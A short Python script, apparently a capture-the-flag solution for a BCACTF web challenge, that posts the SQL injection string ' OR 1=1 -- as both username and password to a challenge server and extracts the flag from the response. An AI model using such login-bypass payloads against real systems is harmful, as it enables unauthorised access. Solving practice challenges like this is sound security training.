#!/usr/bin/python3

import re

import requests

url = "http://web.bcactf.com:49160/"
payload = {	"Username": "' OR 1=1 --",
			"Password": "' OR 1=1 --" }

r = requests.post(url , data = payload)

response = r.text

#print(response)
print(re.findall("bcactf{.*}", response)[0])